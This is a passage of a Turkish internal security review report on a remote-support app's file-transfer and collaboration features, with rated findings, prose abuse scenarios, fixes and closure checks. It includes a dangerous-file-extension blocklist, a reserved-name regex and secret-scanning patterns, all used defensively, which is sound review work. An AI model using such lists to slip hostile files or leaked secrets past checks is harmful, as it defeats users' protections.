Sorun: Protokolde lazer için 30/sn tanımlı, ama yalnız gönderen uyguluyor. `MAX_STROKES` 200 × 500 nokta tavanı ve `CHAT_KEEP` 500 belleği sınırlıyor. Ancak her mesaj tam yeniden çizim/render tetikliyor ve chat yineleme kontrolü O(n). Değiştirilmiş teknisyen istemcisi müşteri sekmesini kilitleyebilir.
Düzeltme: frontend-dev: Alıcıda token bucket uygulanmalı (chat 5/sn, stroke 20/sn, laser 30/sn), aşanlar düşürülmeli.

### [DÜŞÜK] S-P5-7 Tehlikeli uzantı listesi ve Windows ayrılmış ad kapsamında boşluklar — A04
Yer: `packages/contracts/src/files.ts:15,46-50`
Sorun: Listede şunlar yok: `vbe, jse, ws, wsh, msp, mst, inf, ps1xml, psd1, psc1, settingcontent-ms, library-ms, searchconnector-ms, xlam, pptm, dotm, xla, gadget, html, htm, mht, svg` (son dördü tarayıcıda açılıp HTML smuggling/oltalama için kullanılır). `RESERVED` regex'i `CONIN$`, `CONOUT$` ve üst simge rakamlı `COM¹-³`/`LPT¹-³` adlarını kapsamıyor (Windows bunları da ayrılmış sayar). Yol geçişi, RTLO/Cf, sondaki nokta/boşluk, ADS `:` ve uzunluk doğru ele alınıyor. DB CHECK aynı kuralı tekrarlıyor.
Düzeltme: frontend-dev/backend-dev (contracts + fixtures + Go eşi birlikte): listeyi genişletin, regex'i `^(CON|PRN|AUX|NUL|CONIN\$|CONOUT\$|COM[1-9¹²³]|LPT[1-9¹²³])$` yapın.

### [DÜŞÜK] S-P5-8 JS `\p{Cf}` ile MySQL ICU `\p{Cf}` sürüm farkı `file.meta` yazımını düşürebilir — A09
Yer: `collab.ts:66,81-86`; migration `session_files_file_name_chk`
Sorun: Node ve MySQL farklı Unicode sürümleri kullanıyor. Yeni eklenen bir Cf karakteri bir tarafta silinir, diğerinde silinmezse CHECK 3819 hatası verir ve TX geri alınır. Bu durumda kayıt ve audit olmuyor, yalnız log kalıyor (sessiz kayıp, S-P5-1 ile aynı sonuç).
Düzeltme: backend-dev: CHECK hatasında adı `FILE_NAME_FALLBACK` ile değiştirip yeniden yazın (kayıt kaybolmasın) ve metrik artırın.

### Doğrulanan/olumlu (P5)
- **Sunucu `file.meta`:** caps (`file_transfer`) kontrolü `room.caps` üzerinden yapılıyor (sunucu hesaplı, admit anında). Yalnız alıcı tarafın raporu kabul ediliyor. Misafir için `ADMITTED`, teknisyen için `room.admitted` şartı var. Ad sunucuda yeniden temizleniyor. `OK` raporunda tenant sınırı kontrol ediliyor. `session_files` + `audit_logs` tek TX'te yazılıyor. `tenantId`/`sessionId` istemciden değil oda durumundan geliyor (tenant izolasyonu tamam). Hata yanıtında stack/SQL yok (ref'li log).
- **`quality.summary`:** yalnız teknisyenden kabul ediliyor, zod ile sınırlı sayılar ve enum, 5 sn yazma aralığı, 4 KB tavan. `updateMany` `tenantId + consumedAt not null` filtreli. DB CHECK ile eşleşiyor.
- **DC şemaları:** strict, `ctl` 16 KB, chat 2000 karakter, stroke 500 nokta, koordinatlar [0,1], `idx` uint16, sha256 regex, boyut tavanı. Çerçeve çözümlemede boyut kontrolü yapılıyor. `FileReceiveGuard` beyana güvenmiyor (`min(declared, max)`), sıra dışı parçada iptal ediyor, tamamlanma = alınan baytın beyana eşitliği, ardından SHA-256 eşleşmesi. Bozuk dosya sunulmuyor.
- **Kabul diyaloğu:** otomatik kabul yok. 1,5 sn sonra etkinleşme fid başına ayrı. Varsayılan odak "Reddet". Esc reddediyor. Tek bekleyen teklif var, diğerleri "busy" olarak reddediliyor. 30 sn ret bekleme süresi uygulanıyor. Tehlikeli/çift uzantı uyarısı gösteriliyor. İndirme adı temizlenmiş ad (`download={x.name}`). Object URL'ler `dispose`'ta bırakılıyor.
- **Chat XSS:** React metin düğümü kullanılıyor. `apps/web` içinde `dangerouslySetInnerHTML`/`innerHTML`/`eval` yok. Document PiP yalnız aynı origin stil düğümlerini kopyalıyor, dış içerik enjekte etmiyor.
- **Caps yokken düşürme:** güvenlik sınırı her iki uçta değiştirilmemiş kurban istemcisinde (müşteri: sunucunun `hello.caps`'i; konsol: kendi yetkisi) ve sunucuda meta için uygulanıyor. İçerik sunucudan geçmediği için bu, mimariyle uyumlu.
- **Kapanan P4 bulguları:** **S-P4-T3-1 kapandı.** `savedAt` + 120 sn, gelecek damga toleransı 5 sn, canlı oturumda 30 sn'de bir ve `pagehide`'da tazeleniyor (`guest-resume.ts`, `guest-session.tsx:60-70`). **S-P4-T3-2 kapandı.** 35 × 3 sn = 105 sn, `reconnect.conflict` audit'i oda başına dakikada 1 (`ws.ts:23,149`).
- **Migration/grants:** `app` için `session_files` yalnız SELECT/INSERT (append-only, REVOKE ile). CHECK'ler yön/sonuç/sha/boyut/ad için tanımlı. FK `(session_id, tenant_id)` bileşik, bu da çapraz tenant satırını DB'de engelliyor. Dosya içeriği tabloda yok.

### Otomatik tarama (P5)
- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması (`git diff` + izlenmeyen tüm yeni dosyalar, api_key/secret/password/token/özel anahtar/AKIA/ghp_ kalıpları) → eşleşme yok.
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P5-4 (akışlı özet/OPFS), S-P5-6 (alıcı tarafı hız sınırı), S-P5-7 (uzantı listesi), S-P5-8 (CHECK geri dönüşü). S-P5-1 bu turda düzeltilmeli. S-P5-2 ve S-P5-3 tercihen bu pakette düzeltilmeli; S-P5-3 için en azından mimariye risk kabulü yazılmalı.

---

## P5 kod turu 2 (S-P5-1..8 kapanış doğrulaması + yeni yüzeyler)
Tarih: 2026-11-11 · Kapsam: `apps/server/src/signaling/{collab,handlers,types,rooms}.ts`, `packages/contracts/src/{files,ws}.ts`, `apps/web/lib/dc/{files,rate,sha256,use-collab}.ts`, `components/collab/files-panel.tsx`, testler (`p5-guvenlik.test.ts`, `signaling-collab-p5*.test.ts`)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4

### Tur 1 bulgularının kapanışı
| Bulgu | Durum | Kanıt |
|---|---|---|
| S-P5-1 (Yüksek) | **Kapandı** | `collab.ts:29-56` kota anahtarı `taraf:sınıf`; `accepted` (OK/CORRUPT) 60/dk, 2000/oturum, `declined` 20/dk, 500/oturum. Ret seli OK kotasını tüketemiyor. Teknisyen de müşterinin kotasını tüketemiyor, çünkü taraf soketten belirleniyor (`handlers.ts:78,119`) ve mesajdan gelmiyor. Aşımda `file.meta.rate_limited` audit'i yazılıyor (`collab.ts:88,125-135`). İstemci tarafında teklif sınırı 3/10 sn ve fazlası sessizce düşüyor (`files.ts:426`). Karşı tarafın tetiklediği meta tekilleştiriliyor ve dakikada en çok 5 (`files.ts:288-295`). Test: "21 sahte teklif + gerçek transfer → OK raporu" (web) ve "21 ret + OK → kayıt" (server int). |
| S-P5-2 (Orta) | **Kapandı** | Aşan teklif ctl reddi, meta veya liste kaydı üretmiyor. `KEEP` 100, `AUTO_KEEP` 20 (`files.ts:253-276`). Amplifikasyon yok (≤ 5 meta/dk, WS bucket 50/sn). |
| S-P5-3 (Orta) | **Risk azaltıldı (kabul edilebilir)** | Gönderen raporu `file.transfer.sender_report` audit'ine yazılıyor (`collab.ts:97-102`). Müşteri istemcisi her gönderimde rapor veriyor (`files.ts:297-303`). Değiştirilmiş konsol `TO_TECH` raporunu bastırsa da müşteri tarafının izi kalıyor. Kalan boşluk için bkz. S-P5-T2-4. |
| S-P5-4 (Düşük) | **Kapandı** | Özet artımlı hesaplanıyor (`sha256.ts`). Alıcı, parçalar gelirken özetliyor (`files.ts:480`). Bellekte tek kopya tutuluyor (8 MB Blob grupları). 256 MB üstünde disk akışı var. |
| S-P5-5 (Düşük) | **Kapandı** | `files.ts:99` `application/octet-stream`. Tehlikeli uzantı uyarısı indirme satırında tekrarlanıyor (`files-panel.tsx:41`). |
| S-P5-6 (Düşük) | **Kapandı** | `rate.ts` chat 5/sn, annot 30/sn, lazer 30/sn. `use-collab.ts:59` işlemeden önce düşürüyor. |
| S-P5-7 (Düşük) | **Kapandı** | `files.ts:16,48-54` istenen uzantıların tamamı ve `CONIN$`/`CONOUT$`/`COM¹-³`/`LPT¹-³` eklendi. Fixture genişletildi. AC-36 metninin revizyonu proje yöneticisinde (doküman işi). |
| S-P5-8 (Düşük) | **Kapandı** | `isCheckViolation` (`collab.ts:59-63`), adaptör kaynağıyla tutarlı (`@prisma/adapter-mariadb` varsayılan dal `{kind:"mysql", code: errno}`). CHECK reddinde `file.meta.rejected_by_db` audit'i yazılıyor, ad yerine yer tutucu kullanılıyor, sha256/boyut korunuyor, istemciye `VALIDATION` dönüyor. Gerçek MySQL ile entegrasyon testi var (`signaling-collab-p5-dbcheck.test.ts`). |

### Yeni yüzeyler: inceleme
- **Elle yazılmış SHA-256:** Doğru. Projedeki test WebCrypto ile 11 boyutta ve 37 baytlık parçalarla karşılaştırıyor. Ek olarak bu turda Node `crypto` ile karşılaştırıldı: 0–300 bayt arası tüm boyutlar rastgele 1–70 baytlık parçalarla, 1 MiB, 1 MiB+55, 5 MiB+63 ve boş girdi denendi, **0 uyuşmazlık**. 64 MB yaklaşık 260 ms sürüyor. 2^32 bit üstü uzunluk kodlaması (`hex()` hi/lo) doğru. `hex()` durumu değiştiriyor, yani ikinci çağrı farklı sonuç verir. Kodda her transferde yalnız bir kez çağrılıyor (`files.ts:46,492`). Risk yok ama sınıfa "tek kullanımlık" notu düşülmeli. Özet bütünlük amaçlı kullanılıyor, gizli anahtar içermiyor. Bu yüzden yan kanal (sabit zamanlı olmama) önemsiz.
- **Gönderen/alıcı sahteciliği (sunucu):** Taraf (`tech`/`guest`) kimliği doğrulanmış soketten geliyor. Mesajdaki `direction` yalnız "alıcı mı gönderen mi" yolunu seçiyor. Bir taraf diğerinin adına satır yazamıyor. `session_files`'a yalnız `from.side === receiver` olan rapor giriyor. Kotalar taraf başına ayrıldığı için karşı tarafın OK kotası tüketilemiyor. Müşterinin `accepted` sınıfı yalnız kullanıcı kararlarıyla doluyor: kabul edilmiş transfer veya müşterinin başlattığı gönderim (`files.ts:415-419`, transfer başına bir kez).
- **`sender_report` ile audit şişirme:** Sınırlı ama yüksek tavanlı (S-P5-T2-3).
- **`showSaveFilePicker` disk yolu:** Doğrulanmamış içerik hedef adda kalıcılaşmıyor. Özet tutmazsa `abort()` çağrılıyor (`files.ts:119-131`), kayıt penceresi kullanıcı hareketi içinde açılıyor, iptalde teklif beklemede kalıyor. Kısmi dosya konusunda kalan riskler S-P5-T2-1'de.

### [DÜŞÜK] S-P5-T2-1 Disk akışı yolu test edilmemiş; seçim anında hedef dosya oluşuyor/eziliyor, çökmede kısmi `.crswap` kalabiliyor — A04 Insecure Design
Yer: `apps/web/lib/dc/files.ts:333-350` (`accept`), `files.ts:110-139` (`diskSink`); `files-panel.tsx:41,47` (uyarı ve indirme satırı `x.url` koşulunda)
Sorun:
1. Chromium, `showSaveFilePicker` seçimi yapıldığı anda hedef yolda dosyayı oluşturuyor. Mevcut bir dosya seçildiyse onu boşaltıyor. Tarayıcıda ayrıca doğrulanmalı. Bu durumda `abort()` sonrası içerik yazılmıyor ama hedefte 0 baytlık bir dosya kalıyor. Kullanıcı "üzerine yaz" dediyse eski dosya kaybolmuş oluyor.
2. Yazımlar `close()`'a kadar `<ad>.crswap` geçici dosyasında tutuluyor. Sekme veya tarayıcı çökerse ya da süreç öldürülürse, doğrulanmamış ve saldırganın kontrolündeki kısmi içerik diskte kalabiliyor (ad `.crswap` olduğu için doğrudan çalıştırılamaz).
3. Disk yolunda `url` olmadığından tamamlanan satırda tehlikeli/çift uzantı uyarısı tekrar gösterilmiyor (S-P5-5'in disk eşi).
4. Yol için birim testi de e2e testi de yok (`grep showSaveFilePicker|diskSink` test dosyalarında eşleşmiyor).
İstismar senaryosu: Teknisyen 300 MB'lık bir dosyayı yanlış özetle teklif ediyor. Kullanıcı kayıt yeri olarak var olan bir dosyayı seçiyor. Transfer "bozuk" bitiyor ama kullanıcının eski dosyası 0 bayta inmiş oluyor. Kod çalıştırma yok, etki veri kaybı veya kafa karışıklığı ile sınırlı.
Düzeltme: frontend-dev:
- `diskSink` için sahte `WritableLike` ile birim testi yazılmalı: özet tutmazsa `close` çağrılmamalı, `abort` çağrılmalı; iptalde `discard` → `abort`.
- Kabul diyaloğundaki disk bilgisine (`p5.files.bigDisk`) "mevcut dosyanın üzerine yazmayın; doğrulama başarısız olursa boş dosya kalabilir" uyarısı eklenmeli.
- `ok` + `dir=in` + `dangerous` satırında uyarı `url` koşulsuz gösterilmeli.
- İsteğe bağlı: doğrulama başarısız olursa kullanıcıya "boş dosyayı silin" bildirimi gösterilmeli (FSA `remove()` destekleniyorsa `handle.remove()` çağrılabilir).

### [DÜŞÜK] S-P5-T2-2 `file.meta.rate_limited` audit seyreltmesi taraf ayrımı yapmıyor; bir taraf diğerinin aşım kaydını bastırabilir — A09
Yer: `apps/server/src/signaling/collab.ts:125-129` (`room.fileMeta.auditAt[cls]`; anahtar yalnız sınıf), `types.ts:92`
Sorun: Kota `taraf:sınıf` başına tutuluyor, ama aşım audit'inin dakikalık seyreltmesi yalnız `sınıf` başına. Teknisyen, WS'ten doğrudan 21 adet `declined` meta göndererek her dakika kendi aşımını tetikleyebiliyor. Bu durumda aynı dakika içinde müşteri tarafında oluşan `declined` aşımı audit'e yazılmıyor, yalnız log ve metrik kalıyor.
İstismar senaryosu: Müşterinin `declined` kotası tükenmiş olmalı. Bunun için ya müşteri tarafı sınırıyla (5/dk) 100 dakikalık uzun bir oturum gerekir ya da müşteri gerçekten çok ret üretmiş olmalı. Bu ön koşul sağlandığında müşteri elle yaptığı ret/iptal raporlarının düşürüldüğü audit'te görünmez. Etkisi dar, çünkü reddedilen dosya hiç inmemiş oluyor.
Düzeltme: backend-dev: `auditAt` anahtarını `${side}:${cls}` yapın. Integration testine "teknisyen aşımı + misafir aşımı aynı dakikada → 2 satır" senaryosunu ekleyin.

### [DÜŞÜK] S-P5-T2-3 `sender_report` ve kota tavanları ile audit tablosu şişirilebiliyor — A04 / A09
Yer: `apps/server/src/signaling/collab.ts:14-18,97-102`
Sorun: Gönderen raporu da kotadan yer yiyor. Ancak tavanlar yüksek: taraf başına `accepted` 60/dk + `declined` 20/dk, yani dakikada 80 ve oturum başına 2500 audit satırı. Değiştirilmiş konsol, sahte `TO_CUSTOMER` "OK" gönderen raporlarıyla hiçbir transfer yapmadan bu tavana ulaşabiliyor (sunucu gönderen raporunu herhangi bir transferle eşleştirmiyor). Kendi başlattığı N eşzamanlı oturumla (misafiri kendisi kabul ederek) bu sayı N katına çıkıyor. Satırlar teknisyenin `userId`'siyle atfedilebilir ve tenant içi, bu yüzden düşük.
İstismar senaryosu: İçeriden kötü niyetli bir teknisyen, audit ekranını gürültüyle doldurarak gerçek bir olayı gömmeye çalışıyor (örneğin 10 oturum × 80/dk = 800 satır/dk).
Düzeltme: backend-dev:
- Gönderen raporu için ayrı ve düşük bir sınıf tanımlanmalı (ör. `sender` 10/dk, 200/oturum). Meşru akışta bu, transfer başına 1 rapor demek.
- Teknisyen başına tüm odalardaki `file.meta` toplamı için bir sayaç ya da `rs_file_meta_total{result="sender_reported"}` oran alarmı eklenmeli (runbook).
- Audit ekranında `action` filtresiyle bu gürültü ayıklanabildiği için acil değil.

### [DÜŞÜK] S-P5-T2-4 `session_files` satırı raporlayanı taşımıyor; gönderen ve alıcı raporları eşleştirilmiyor — A09 (bilgi / risk kabulü)
Yer: `collab.ts:104-110` (satırda raporlayan yok), migration `session_files`
Sorun: Alıcı raporu tek kaynak. Değiştirilmiş müşteri istemcisi `TO_CUSTOMER` yönünde sahte bir "teknisyen `x.exe` gönderdi, OK" satırı yazabiliyor (tur 1'den beri tasarım gereği böyle). Audit satırındaki `username: "customer"` bu kaydı ayırt ediyor. Ancak yalnız `session_files`'ı okuyan bir rapor ya da ekran (P12/P13) bunu olgu olarak gösterir. Gönderen raporu ile alıcı raporu arasında `fid` bağı yok, sunucu "iki taraf da aynı sha256'yı bildirdi mi" kontrolünü yapamıyor.
Düzeltme: mimar: Rapor ekranı tasarlanırken `session_files` audit'teki actor ile birleştirilmeli veya `reporter` kolonu eklenmeli. `file.meta`'ya `fid` eklenerek gönderen ve alıcı raporlarının eşleşmesi gösterilmeli ("doğrulanmış/tek taraflı"). P12/P13 kapsamında ele alınabilir. Şimdilik risk kabulü olarak `docs/mimari-protokol.md` §3'e not düşülmeli.

### Olumlu (tur 2)
- Kota kontrolü, gönderen/alıcı ayrımından önce ve `too_large` kontrolünden sonra yapılıyor. Yetkisiz (`caps`) meta kota tüketmiyor.
- `rejectedByDb` ve `auditRateLimited` kendi hatalarını yakalıyor ve `ref` ile logluyor. Hata yanıtlarında stack veya SQL yok.
- İstemcide teklif sınırı, meta tekilleştirmesi, liste sınırı ve chat/annot sınırı birim testleriyle kapsanmış. `lib/dc` testleri bu turda yeniden çalıştırıldı: **23/23 geçti**.
- Disk yolunda kayıt penceresi `await`'ten önce ve kullanıcı hareketi içinde çağrılıyor. Seçim sürerken teklif iptal edilirse yazıcı `abort` ediliyor (`files.ts:341`).
- `verify` tek sefer çalışıyor (durum `receiving` → `verifying` eşzamanlı geçiyor). `hex()` çift çağrılmıyor.

### Otomatik tarama (P5 tur 2)
- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- Sır taraması: `git diff` eklenen satırlar, izlenmeyen tüm dosyalar ve P5 dizinleri (`signaling`, `contracts/src`, `contracts/fixtures`, `lib/dc`, `components/collab`, `e2e/p5-collab.spec.ts`) api_key/secret/password/token (≥ 8 karakter değer), AKIA, ghp_ ve özel anahtar kalıplarıyla tarandı → **eşleşme yok** (tek isabet, bu raporun önceki turdaki açıklama satırı).
- `git log --all -- '*.env*'` → yalnız `.env.example`.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P5-T2-1 (disk yolu testi ve uyarı), S-P5-T2-2 (`auditAt` taraf anahtarı, küçük düzeltme, bu pakette yapılabilir), S-P5-T2-3 (gönderen raporu için ayrı düşük kota ve alarm), S-P5-T2-4 (raporlayan ve `fid` eşleşmesi, P12/P13). P5 için güvenlik kapısı açık: Kritik/Yüksek 0.
